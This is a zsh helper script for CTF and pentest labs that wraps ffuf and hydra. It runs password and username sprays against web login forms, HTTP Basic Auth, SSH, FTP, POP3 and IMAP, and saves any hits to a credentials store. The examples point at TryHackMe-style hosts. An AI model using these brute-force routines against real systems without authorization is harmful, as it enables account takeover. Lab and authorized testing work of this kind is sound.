# ========================
# hydra helpers
# ========================

_ffufweb-usage() {
  echo "usage:"
  echo "  ffufweb [options] <url> <username>       # password spray (default)"
  echo "  ffufweb -U [options] <url> <password>     # username spray"
  echo ""
  echo "options:"
  echo "  -U                     fixed password, FUZZ in username (wordlist: \$RECON_USERLIST)"
  echo "  -d <data>              POST body (default pass: username=<user>&password=FUZZ"
  echo "                         default -U: username=FUZZ&password=<pass>)"
  echo "  -w <file>              wordlist (default: \$RECON_PASSLIST or \$RECON_USERLIST with -U)"
  echo "  -H <header>            extra header (repeatable)"
  echo "  -fw|-fs|-fc|-fl <n>    ffuf filters (e.g. -fw 8)"
  echo "  -fr <regex>            filter regex"
  echo "  -t <n>                 threads (default 40)"
  echo "  -n                     print command only"
  echo ""
  echo "examples:"
  echo "  ffufweb http://lookup.thm/login.php admin -fw 8"
  echo "  ffufweb -U http://lookup.thm/login.php password123 -fr 'Wrong username or password'"
  echo "  ffufweb -U http://lookup.thm/login.php 'Password123' -w users.txt -fr '...'"
  echo ""
  echo "  -fw は password spray 向け。username spray は失敗レスポンスの words/size が違うので要調整"
  echo ""
  echo "  on hit: creds → creds-list (Ctrl+C でもヒット分は保存)"
  echo ""
  echo "  hydraweb: hydra http-post-form (:F/:S). ffufweb: ffuf spray (-fw など)"
}

_ffufweb-filters-summary() {
  local -a extra=("$@")
  if (( ${#extra[@]} )); then
    echo "${extra[*]}"
  else
    echo "(none)"
  fi
}

_ffufweb-cred-ip() {
  local url="$1"
  if [[ -n "${IP:-}" ]]; then
    echo "$IP"
    return 0
  fi
  if [[ "$url" =~ ^https?://([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; then
    echo "${match[1]}"
    return 0
  fi
  target-current 2>/dev/null
}

_ffufweb-import-creds() {
  local import_json=""
  if [[ -z "${_FFUFWEB_CRED_IP:-}" ]]; then
    return 0
  fi
  if [[ -z "${_FFUFWEB_USER:-}" && -z "${_FFUFWEB_PASS:-}" ]]; then
    return 0
  fi
  if [[ -f "${_FFUFWEB_JSON}.live" ]]; then
    import_json="${_FFUFWEB_JSON}.live"
  elif [[ -f "${_FFUFWEB_JSON:-}" ]]; then
    import_json="$_FFUFWEB_JSON"
  fi
  [[ -n "$import_json" ]] || return 0
  if [[ -n "${_FFUFWEB_USER:-}" ]]; then
    /usr/bin/python3 "${RECON_APP:-/opt/recon/recon.py}" creds-import-ffuf \
      "$_FFUFWEB_CRED_IP" "$_FFUFWEB_USER" --file "$import_json"
  else
    /usr/bin/python3 "${RECON_APP:-/opt/recon/recon.py}" creds-import-ffuf \
      "$_FFUFWEB_CRED_IP" --password "$_FFUFWEB_PASS" --file "$import_json"
  fi
}

_ffufweb-cleanup() {
  _ffufweb-import-creds
  if [[ -n "${_FFUFWEB_JSON:-}" ]]; then
    rm -f "$_FFUFWEB_JSON" "${_FFUFWEB_JSON}.live"
  fi
  rm -f "${_FFUFWEB_LOG:-}"
  unset _FFUFWEB_CRED_IP _FFUFWEB_USER _FFUFWEB_PASS _FFUFWEB_JSON _FFUFWEB_LOG
}

_ffufweb-ffuf-filter() {
  local json_live="$1" total="${2:-0}"
  /usr/bin/python3 -u -c "
import json, re, sys

json_live = sys.argv[1]
total_hint = int(sys.argv[2] or 0)
progress_re = re.compile(r'Progress:\s*\[(\d+)/(\d+)\]')
errors_re = re.compile(r'Errors:\s*(\d+)')
hit_re = re.compile(r'(\S+)\s+\[Status:\s*(\d+),\s*Size:\s*(\d+)')
ansi_re = re.compile(r'\x1b\[[0-9;?]*[ -/]*[@-~]')

state = {'cur': 0, 'tot': total_hint, 'errors': 0}
seen = set()
hits = []
header_done = False
progress_active = False
last_drawn = -1

def progress_line():
    cur, tot = state['cur'], state['tot']
    if not tot:
        return None
    pct = cur * 100 // tot
    err = state['errors']
    suffix = f'  errors={err}' if err else ''
    return f'[*] {cur}/{tot} ({pct}%){suffix}'

def ensure_header():
    global header_done
    if header_done:
        return
    sys.stderr.write('===== results =====\n')
    sys.stderr.flush()
    header_done = True

def clear_progress():
    global progress_active
    if progress_active:
        sys.stderr.write('\r\033[2K')
        sys.stderr.flush()
        progress_active = False

def show_progress(force=False):
    global progress_active, last_drawn
    pl = progress_line()
    if not pl:
        return
    if not force and state['cur'] == last_drawn:
        return
    last_drawn = state['cur']
    ensure_header()
    sys.stderr.write('\r\033[2K' + pl)
    sys.stderr.flush()
    progress_active = True

def write_live():
    with open(json_live, 'w', encoding='utf-8') as f:
        json.dump({'results': list(hits)}, f)

def add_hit(password, status, size):
    global progress_active, last_drawn
    if password in seen:
        return
    seen.add(password)
    hits.append({
        'input': {'FUZZ': password},
        'status': int(status),
        'length': int(size),
    })
    write_live()
    ensure_header()
    clear_progress()
    sys.stderr.write(f'[+] {password}\tstatus={status}\tsize={size}\n')
    sys.stderr.flush()
    last_drawn = -1
    show_progress(force=True)

def finish():
    ensure_header()
    clear_progress()
    if not seen:
        sys.stderr.write('[-] no passwords matched\n')
    sys.stderr.flush()

def apply_progress(text):
    ms = list(progress_re.finditer(text))
    if not ms:
        return
    m = ms[-1]
    state['cur'] = int(m.group(1))
    state['tot'] = int(m.group(2))
    em = errors_re.search(m.group(0))
    if em:
        state['errors'] = int(em.group(1))
    show_progress()

def apply_hits(text):
    for line in text.splitlines():
        line = ansi_re.sub('', line).strip()
        if not line:
            continue
        m = hit_re.search(line)
        if not m:
            continue
        add_hit(m.group(1), m.group(2), m.group(3))

def scan_buf(buf):
    clean = ansi_re.sub('', buf)
    if 'Progress:' in clean:
        apply_progress(clean)
    apply_hits(clean)

show_progress(force=True)

buf = ''
try:
    while True:
        chunk = sys.stdin.buffer.read(256)
        if not chunk:
            break
        buf += chunk.decode('utf-8', errors='replace')
        scan_buf(buf)
        if len(buf) > 8192:
            buf = buf[-4096:]
    if buf.strip():
        scan_buf(buf)
finally:
    finish()
" "$json_live" "$total"
}

ffufweb() {
  local url="" fixed="" data="" wordlist="" threads=40 dry_run=0 user_spray=0
  local user="" pass="" spray_label="passwords"
  local -a headers=( "Content-Type: application/x-www-form-urlencoded" )
  local -a ffuf_extra=()

  if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
    _ffufweb-usage
    return 0
  fi

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -U)
        user_spray=1
        shift
        ;;
      -d)
        data="$2"
        shift 2
        ;;
      -w)
        wordlist="$2"
        shift 2
        ;;
      -H)
        headers+=("$2")
        shift 2
        ;;
      -t)
        threads="$2"
        shift 2
        ;;
      -n)
        dry_run=1
        shift
        ;;
      -fw|-fs|-fc|-fl|-fr|-mc|-ms|-ml|-mr)
        ffuf_extra+=("$1" "$2")
        shift 2
        ;;
      http://*|https://*)
        url="$1"
        shift
        ;;
      -*)
        echo "[-] ffufweb: unknown option: $1" >&2
        return 1
        ;;
      *)
        if [[ -z "$fixed" ]]; then
          fixed="$1"
        else
          echo "[-] ffufweb: unexpected argument: $1" >&2
          return 1
        fi
        shift
        ;;
    esac
  done

  if [[ -z "$url" || -z "$fixed" ]]; then
    _ffufweb-usage
    return 1
  fi

  if (( user_spray )); then
    pass="$fixed"
    wordlist="${wordlist:-${RECON_USERLIST:-/usr/share/seclists/Usernames/Names/names.txt}}"
    spray_label="usernames"
    [[ -z "$data" ]] && data="username=FUZZ&password=${pass}"
  else
    user="$fixed"
    wordlist="${wordlist:-$RECON_PASSLIST}"
    [[ -z "$data" ]] && data="username=${user}&password=FUZZ"
  fi

  if [[ ! -f "$wordlist" ]]; then
    echo "[-] ffufweb: wordlist not found: $wordlist" >&2
    return 1
  fi

  if ! command -v ffuf >/dev/null 2>&1; then
    echo "[-] ffufweb: ffuf not found" >&2
    return 1
  fi

  local cred_ip json log rc wl_total cmd_str
  local -a run_cmd
  cred_ip="$(_ffufweb-cred-ip "$url")"
  wl_total="$(/usr/bin/wc -l <"$wordlist" | tr -d '[:space:]')"

  local -a cmd=(
    ffuf
    -w "$wordlist"
    -X POST
    -u "$url"
    -d "$data"
    -t "$threads"
    -o /dev/null
  )
  local hdr
  for hdr in "${headers[@]}"; do
    cmd+=(-H "$hdr")
  done
  cmd+=("${ffuf_extra[@]}")

  json="$(/usr/bin/mktemp "${TMPDIR:-/tmp}/ffufweb.XXXXXX.json")"
  log="$(/usr/bin/mktemp "${TMPDIR:-/tmp}/ffufweb.XXXXXX.log")"
  : >"${json}.live"

  _FFUFWEB_CRED_IP="$cred_ip"
  _FFUFWEB_USER="$user"
  _FFUFWEB_PASS="$pass"
  _FFUFWEB_JSON="$json"
  _FFUFWEB_LOG="$log"
  trap '_ffufweb-cleanup' EXIT INT TERM

  if command -v stdbuf >/dev/null 2>&1; then
    run_cmd=(stdbuf -o0 -e0 "${cmd[@]}")
  else
    run_cmd=("${cmd[@]}")
  fi
  cmd_str="${(j: :)${(@q)run_cmd}}"

  echo "[*] url: $url"
  if (( user_spray )); then
    echo "[*] mode: username spray (fixed password)"
    echo "[*] pass: $pass"
  else
    echo "[*] mode: password spray (fixed user)"
    echo "[*] user: $user"
  fi
  echo "[*] body: $data"
  echo "[*] wordlist: $wordlist"
  echo "[*] scan: ${wl_total:-?} ${spray_label}"
  echo "[*] filters: $(_ffufweb-filters-summary "${ffuf_extra[@]}")"
  if (( user_spray )) && [[ "${ffuf_extra[*]}" == *"-fw"* ]]; then
    echo "[i] -U + -fw: word count is often wrong for username spray — calibrate with curl or use -fr" >&2
  fi
  [[ -n "$cred_ip" ]] && echo "[*] creds ip: $cred_ip"
  echo ""

  if (( dry_run )); then
    echo "[*] cmd: $cmd_str"
    trap - EXIT INT TERM
    rm -f "$json" "${json}.live" "$log"
    unset _FFUFWEB_CRED_IP _FFUFWEB_USER _FFUFWEB_PASS _FFUFWEB_JSON _FFUFWEB_LOG
    return 0
  fi

  if command -v script >/dev/null 2>&1; then
    script -q -e -f -c "$cmd_str" /dev/null 2>&1 | _ffufweb-ffuf-filter "${json}.live" "$wl_total"
  else
    "${run_cmd[@]}" 2>&1 | _ffufweb-ffuf-filter "${json}.live" "$wl_total"
  fi
  rc=${pipestatus[1]:-$?}

  if [[ -z "$cred_ip" ]]; then
    echo "[i] creds ip unknown — target-set <ip> to auto-save hits" >&2
  fi

  return $rc
}

_hydraweb-usage() {
  echo "usage:"
  echo "  hydraweb [-H vhost] [-w wordlist] [target] <path> <user> <F|S> <text> <user_field> [pass_field] [extra_post] [cookie]"
  echo "  hydraweb [-H vhost] [-L userlist] [-w wordlist] [target] <path> <F|S> <text> <user_field> [pass_field] [extra_post] [cookie]"
  echo "  omit target when \$IP is set (target-set <ip>)"
  echo "  -H vhost: Host header (THM: hydraweb -H lookup.thm /login.php ...)"
  echo "  -L userlist: username list for spray mode"
  echo "  -w wordlist: password wordlist (default: \$RECON_PASSLIST)"
  echo "  cookie: sent as H=Cookie: ... (e.g. PHPSESSID=abc; security=low)"
  echo ""
  echo "examples:"
  echo "  hydraweb /login.php Rick F \"Invalid username or password\" username password"
  echo "  hydraweb -L ./users.txt /login.php F \"Invalid username or password\" username password"
  echo "  hydraweb -H lookup.thm /login.php admin F \"Wrong password\" username password"
  echo "  hydraweb -w ./passwords.txt /login.php admin F \"Wrong password\" username password"
  echo "  hydraweb /login.php admin F \"failed\" username password sub=Login \"PHPSESSID=abc; security=low\""
  echo ""
  echo "extra_post default: sub=Login  (matches login.php submit button)"
  echo "  on hit: creds → creds-list (hydra -V output, stops at first hit with -f)"
  echo ""
  echo "  word-count / size filters: use ffufweb (e.g. ffufweb http://lookup.thm/login.php admin -fw 8)"
}

hydraweb() {
  local target path user mode text userfield passfield extra_post cookie form host_header port="" wordlist="" passlist="" userlist=""
  local user_flag="-l" user_arg=""

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -H)
        if [[ -z "${2:-}" ]]; then
          echo "[-] hydraweb: -H requires a value" >&2
          return 1
        fi
        host_header="$2"
        shift 2
        ;;
      -w)
        if [[ -z "${2:-}" ]]; then
          echo "[-] hydraweb: -w requires a file" >&2
          return 1
        fi
        wordlist="$2"
        shift 2
        ;;
      -L)
        if [[ -z "${2:-}" ]]; then
          echo "[-] hydraweb: -L requires a file" >&2
          return 1
        fi
        userlist="$2"
        shift 2
        ;;
      *)
        break
        ;;
    esac
  done

  if [[ -n "$userlist" ]]; then
    if [[ $# -lt 4 ]]; then
      _hydraweb-usage
      return 1
    fi
  elif [[ $# -lt 5 ]]; then
    _hydraweb-usage
    return 1
  fi

  if [[ "$1" == http://* || "$1" == https://* ]]; then
    local spec="${1#*://}" target_spec=""
    shift
    if [[ "$spec" == */* ]]; then
      target_spec="${spec%%/*}"
      path="/${spec#*/}"
    else
      target_spec="$spec"
      path="${1:-}"
      shift
    fi
    target_spec="${target_spec%%\?*}"
    if [[ "$target_spec" == *:* ]]; then
      target="${target_spec%%:*}"
      port="${target_spec#*:}"
      [[ "$port" =~ '^[0-9]+$' ]] || port=""
    else
      target="$target_spec"
    fi
  elif [[ "$1" == /* ]]; then
    target="${IP:-}"
    if [[ -z "$target" ]]; then
      echo "no target: target-set <ip> or pass IP/URL as first arg" >&2
      return 1
    fi
    path="$1"
    shift
  elif [[ "$1" == *"/"* ]]; then
    local spec="$1" target_spec=""
    if [[ "$spec" == *://* ]]; then
      spec="${spec#*://}"
    fi
    target_spec="${spec%%/*}"
    path="/${spec#*/}"
    shift
    if [[ "$target_spec" == *:* ]]; then
      target="${target_spec%%:*}"
      port="${target_spec#*:}"
      [[ "$port" =~ '^[0-9]+$' ]] || port=""
    else
      target="$target_spec"
    fi
  else
    target="$1"
    path="${2:-}"
    shift 2
  fi

  if [[ -z "$target" ]]; then
    target="${IP:-}"
  fi
  if [[ -z "$target" ]]; then
    echo "no target: target-set <ip> or pass IP/URL as first arg" >&2
    return 1
  fi

  if [[ -z "$path" ]]; then
    _hydraweb-usage
    return 1
  fi
  [[ "$path" == /* ]] || path="/$path"

  if [[ -n "$userlist" ]]; then
    mode="$1"
    text="$2"
    userfield="$3"
    passfield="${4:-password}"
    extra_post="${5:-sub=Login}"
    cookie="${6:-}"
    user_flag="-L"
    user_arg="$userlist"
  else
    user="$1"
    mode="$2"
    text="$3"
    userfield="$4"
    passfield="${5:-password}"
    extra_post="${6:-sub=Login}"
    cookie="${7:-}"
    user_arg="$user"
  fi
  passlist="${wordlist:-$RECON_PASSLIST}"

  if [[ -n "$userlist" && ! -f "$userlist" ]]; then
    echo "[-] hydraweb: userlist not found: $userlist" >&2
    return 1
  fi
  if [[ ! -f "$passlist" ]]; then
    echo "[-] hydraweb: wordlist not found: $passlist" >&2
    return 1
  fi

  form="${path}:${userfield}=^USER^&${passfield}=^PASS^"
  if [[ -n "$extra_post" ]]; then
    form="${form}&${extra_post}"
  fi
  if [[ -n "$host_header" ]]; then
    form="${form}:H=Host: ${host_header}"
  fi
  if [[ -n "$cookie" ]]; then
    form="${form}:H=Cookie: ${cookie}"
  fi
  form="${form}:${mode}=${text}"

  echo "[*] hydra form: ${form}"
  [[ -n "$host_header" ]] && echo "[*] vhost: ${host_header}"
  [[ -n "$cookie" ]] && echo "[*] cookie: ${cookie}"
  if [[ "$user_flag" == "-L" ]]; then
    echo "[*] target: http://${host_header:-$target}${port:+:$port}${path}  userlist: ${userlist}"
  else
    echo "[*] target: http://${host_header:-$target}${port:+:$port}${path}  user: $user"
  fi
  echo "[*] wordlist: $passlist"

  local log rc
  log="$(/usr/bin/mktemp "${TMPDIR:-/tmp}/hydraweb.XXXXXX")"
  trap 'rm -f "$log"' EXIT INT TERM

  local -a hydra_cmd=(/usr/bin/hydra "$user_flag" "$user_arg" -P "$passlist" -t 32 -f -V)
  [[ -n "$port" ]] && hydra_cmd+=(-s "$port")
  hydra_cmd+=("$target" http-post-form "$form")

  "${hydra_cmd[@]}" 2>&1 | /usr/bin/tee "$log"
  rc=${pipestatus[1]:-$?}

  /usr/bin/python3 "${RECON_APP:-/opt/recon/recon.py}" creds-import-hydra "$target" --file "$log"

  return $rc
}

# usage: _hydra-parse-args <default_user> [args...]
# sets: _HYDRA_TARGET _HYDRA_USER _HYDRA_WORDLIST
_hydra-parse-args() {
  local default_user="$1"
  shift
  local -a args=("$@")

  _HYDRA_WORDLIST="$RECON_PASSLIST"
  _HYDRA_TARGET=""
  _HYDRA_USER=""

  if [[ -n "${args[-1]}" && -f "${args[-1]:A}" ]]; then
    _HYDRA_WORDLIST="${args[-1]:A}"
    if (( ${#args[@]} > 1 )); then
      args=("${args[1,-2]}")
    else
      args=()
    fi
  fi

  if [[ ${#args[@]} -ge 2 ]] && _recon-looks-like-host "${args[1]}"; then
    _HYDRA_TARGET="${args[1]}"
    _HYDRA_USER="${args[2]}"
  elif [[ ${#args[@]} -eq 2 ]] && _recon-looks-like-host "${args[2]}"; then
    _HYDRA_TARGET="${args[2]}"
    _HYDRA_USER="${args[1]}"
  elif [[ ${#args[@]} -eq 2 ]]; then
    _HYDRA_TARGET="${args[1]}"
    _HYDRA_USER="${args[2]}"
  elif [[ ${#args[@]} -eq 1 ]]; then
    if _recon-looks-like-host "${args[1]}"; then
      _HYDRA_TARGET="${args[1]}"
      _HYDRA_USER="$default_user"
    else
      _HYDRA_TARGET="${IP:-}"
      _HYDRA_USER="${args[1]}"
    fi
  elif [[ ${#args[@]} -eq 0 ]]; then
    _HYDRA_TARGET="${IP:-}"
    _HYDRA_USER="$default_user"
  else
    return 1
  fi

  [[ -n "$_HYDRA_TARGET" && -n "$_HYDRA_USER" ]]
}

_hydra-run-auth-service() {
  local service="$1"
  local target="$2"
  local user_flag="$3"   # -l or -L
  local user_arg="$4"
  local wordlist="$5"
  local threads="$6"
  local log_prefix="$7"
  local port="${8:-}"

  if [[ ! -f "$wordlist" ]]; then
    echo "wordlist not found: $wordlist"
    return 1
  fi

  local target_label="${service}://$target"
  [[ -n "$port" ]] && target_label="${target_label}:$port"
  if [[ "$user_flag" == -L ]]; then
    echo "[*] target: $target_label  -L ${user_arg:t}"
  else
    echo "[*] target: $target_label  user: $user_arg"
  fi
  echo "[*] wordlist: $wordlist"

  local log rc
  log="$(mktemp "${TMPDIR:-/tmp}/${log_prefix}.XXXXXX")"
  trap 'rm -f "$log"' EXIT INT TERM

  local -a hydra_cmd=(hydra "$user_flag" "$user_arg" -P "$wordlist" -t "$threads" -f -V)
  [[ -n "$port" ]] && hydra_cmd+=(-s "$port")
  hydra_cmd+=("$target" "$service")

  "${hydra_cmd[@]}" 2>&1 | tee "$log"
  rc=${pipestatus[1]}

  python3 "$RECON_APP" creds-import-hydra "$target" --file "$log"

  return $rc
}

_hydra-list-service-usage() {
  local name="$1"
  echo "usage: ${name} [-p port] [-t threads] [target] -L users.txt -P passes.txt"
  echo "       ${name} [-p port] [-t threads] [target] <user> [wordlist]"
  echo "  hits saved to creds-list via creds-import-hydra"
  echo "  default wordlist: \$RECON_PASSLIST   default threads: 16"
  echo "  examples:"
  echo "    ${name} -L users.txt -P passes.txt"
  echo "    ${name} -p 143 -L users.txt -P passes.txt"
  echo "    ${name} seina \$RECON_PASSLIST"
}

_hydra-service-core() {
  local name="$1"
  local service="$2"
  local default_user="$3"
  local default_threads="$4"
  local allow_list_mode="$5"
  local usage_fn="$6"
  local require_user="$7"
  shift 7

  local port="" threads="$default_threads"
  local userfile="" passfile="" target=""
  local -a args=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -p[0-9]*)
        port="${1#-p}"
        shift
        ;;
      -p)
        port="$2"
        shift 2
        ;;
      -t)
        threads="$2"
        shift 2
        ;;
      -L)
        userfile="$2"
        shift 2
        ;;
      -P)
        passfile="$2"
        shift 2
        ;;
      -h|--help)
        "$usage_fn" "$name"
        return 0
        ;;
      *)
        args+=("$1")
        shift
        ;;
    esac
  done

  (( $+functions[target-load] )) && [[ -z "${IP:-}" ]] && target-load 2>/dev/null

  if [[ -n "$userfile" || -n "$passfile" ]]; then
    if [[ "$allow_list_mode" != true || -z "$userfile" || -z "$passfile" ]]; then
      "$usage_fn" "$name" >&2
      return 1
    fi
    if [[ ! -f "$userfile" || ! -f "$passfile" ]]; then
      echo "[-] userlist or passlist not found" >&2
      return 1
    fi
    target="${args[1]:-${IP:-}}"
    [[ -z "$target" ]] && {
      echo "[-] no target ip — target-set <ip> first" >&2
      return 1
    }
    _hydra-run-auth-service "$service" "$target" -L "$userfile" "$passfile" "$threads" "$name" "$port"
    return $?
  fi

  if [[ "$require_user" == true && ${#args[@]} -eq 0 ]]; then
    "$usage_fn" "$name" >&2
    return 1
  fi

  _hydra-parse-args "$default_user" "${args[@]}" || {
    "$usage_fn" "$name" >&2
    return 1
  }

  _hydra-run-auth-service "$service" "$_HYDRA_TARGET" -l "$_HYDRA_USER" "$_HYDRA_WORDLIST" "$threads" "$name" "$port"
}

_hydrassh-usage() {
  echo "usage: hydrassh [-p port] [-t threads] [target] <user> [wordlist]"
  echo "  default wordlist: \$RECON_PASSLIST   default threads: 32"
  echo "  omit target when \$IP is set (target-set <ip>)"
  echo "  on hit: creds saved to creds-list (creds-import-hydra → cl)"
  echo
  echo "examples:"
  echo "  hydrassh root"
  echo "  hydrassh -p 6498 boring"
  echo "  hydrassh 10.10.10.10 admin ./wordlist.txt"
}

hydrassh() {
  _hydra-service-core hydrassh ssh "" 32 false _hydrassh-usage true "$@"
}

_hydraftp-usage() {
  echo "usage: hydraftp [-p port] [-t threads] [target] [user] [wordlist]"
  echo "  hydra FTP password spray (default user: anonymous)"
  echo "  default wordlist: \$RECON_PASSLIST   default threads: 16"
  echo "  target: IPv4 or FQDN (team.thm); omit when \$IP is set (target-set <ip>)"
  echo "  on hit: creds saved to creds-list (creds-import-hydra → cl)"
  echo
  echo "examples:"
  echo "  hydraftp                    # anonymous @ \$IP"
  echo "  hydraftp team.thm           # anonymous @ team.thm"
  echo "  hydraftp team.thm ./locks.txt"
  echo "  hydraftp ftpuser ./locks.txt"
  echo "  hydraftp -p 2121 team.thm ftpuser"
}

hydraftp() {
  _hydra-service-core hydraftp ftp anonymous 16 false _hydraftp-usage false "$@"
}

hydrapop3() {
  _hydra-service-core hydrapop3 pop3 "" 16 true _hydra-list-service-usage false "$@"
}

hydraimap() {
  _hydra-service-core hydraimap imap "" 16 true _hydra-list-service-usage false "$@"
}

_hydra-run-http-get() {
  local target="$1"
  local user="$2"
  local wordlist="$3"
  local threads="$4"
  local log_prefix="$5"
  local port="$6"
  local url_path="$7"
  local user_flag="$8"   # -l or -L
  local user_arg="$9"

  url_path="${url_path:-/}"
  [[ "$url_path" != /* ]] && url_path="/${url_path}"

  if [[ ! -f "$wordlist" ]]; then
    echo "wordlist not found: $wordlist"
    return 1
  fi

  local target_label="http://${target}${port:+:$port}${url_path}"
  if [[ "$user_flag" == -L ]]; then
    echo "[*] target: $target_label  -L ${user_arg:t}"
  else
    echo "[*] target: $target_label  user: $user"
  fi
  echo "[*] wordlist: $wordlist"

  local log rc
  log="$(mktemp "${TMPDIR:-/tmp}/${log_prefix}.XXXXXX")"
  trap 'rm -f "$log"' EXIT INT TERM

  local -a hydra_cmd=(hydra "$user_flag" "$user_arg" -P "$wordlist" -t "$threads" -f -V)
  [[ -n "$port" ]] && hydra_cmd+=(-s "$port")
  hydra_cmd+=("$target" http-get "$url_path")

  "${hydra_cmd[@]}" 2>&1 | tee "$log"
  rc=${pipestatus[1]}

  python3 "$RECON_APP" creds-import-hydra "$target" --file "$log"

  return $rc
}

_hydrabasic-usage() {
  echo "usage: hydrabasic [-p port] [target] <user> [path] [wordlist]"
  echo "       hydrabasic [-p port] [target] -L users.txt [-P wordlist] [path]"
  echo "  HTTP Basic Auth (hydra http-get)"
  echo "  default path: /   default wordlist: \$RECON_PASSLIST"
  echo "  omit target when \$IP is set (target-set <ip>)"
  echo "  on hit: creds saved to creds-list (creds-import-hydra → cl)"
  echo
  echo "examples:"
  echo "  hydrabasic barry"
  echo "  hydrabasic barry /admin/"
  echo "  hydrabasic -p 8080 barry /protected/ ./wordlist.txt"
  echo "  hydrabasic -L users.txt -P passes.txt /"
}

hydrabasic() {
  local port="" threads=16
  local userfile="" passfile="" url_path="/"
  local -a args=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -p[0-9]*)
        port="${1#-p}"
        shift
        ;;
      -p)
        port="$2"
        shift 2
        ;;
      -t)
        threads="$2"
        shift 2
        ;;
      -L)
        userfile="$2"
        shift 2
        ;;
      -P)
        passfile="$2"
        shift 2
        ;;
      -h|--help)
        _hydrabasic-usage
        return 0
        ;;
      *)
        args+=("$1")
        shift
        ;;
    esac
  done

  (( $+functions[target-load] )) && [[ -z "${IP:-}" ]] && target-load 2>/dev/null

  if [[ -n "$userfile" ]]; then
    local target="${args[1]:-${IP:-}}"
    [[ -z "$target" ]] && {
      echo "[-] no target ip — target-set <ip> first" >&2
      _hydrabasic-usage >&2
      return 1
    }
    [[ -f "$userfile" ]] || {
      echo "[-] userlist not found: $userfile" >&2
      return 1
    }
    passfile="${passfile:-$RECON_PASSLIST}"
    if [[ ${#args[@]} -ge 1 ]] && _recon-looks-like-host "${args[1]}"; then
      target="${args[1]}"
      [[ ${#args[@]} -ge 2 && "${args[2]}" == /* ]] && url_path="${args[2]}"
    elif [[ ${#args[@]} -ge 1 && "${args[1]}" == /* ]]; then
      url_path="${args[1]}"
    fi
    _hydra-run-http-get "$target" "" "$passfile" "$threads" hydrabasic "$port" "$url_path" -L "$userfile"
    return $?
  fi

  local wordlist="$RECON_PASSLIST"
  if [[ -n "${args[-1]}" && -f "${args[-1]:A}" ]]; then
    wordlist="${args[-1]:A}"
    if (( ${#args[@]} > 1 )); then
      args=("${args[1,-2]}")
    else
      args=()
    fi
  fi

  local target="" user=""
  if [[ ${#args[@]} -ge 2 ]] && _recon-looks-like-host "${args[1]}"; then
    target="${args[1]}"
    user="${args[2]}"
    args=("${args[3,-1]}")
  elif [[ ${#args[@]} -ge 1 ]]; then
    target="${IP:-}"
    user="${args[1]}"
    args=("${args[2,-1]}")
  else
    _hydrabasic-usage >&2
    return 1
  fi

  [[ -n "$target" && -n "$user" ]] || {
    echo "[-] need target and user (target-set <ip> or pass IP)" >&2
    _hydrabasic-usage >&2
    return 1
  }

  if [[ ${#args[@]} -ge 1 && "${args[1]}" == /* ]]; then
    url_path="${args[1]}"
  fi

  _hydra-run-http-get "$target" "$user" "$wordlist" "$threads" hydrabasic "$port" "$url_path" -l "$user"
}
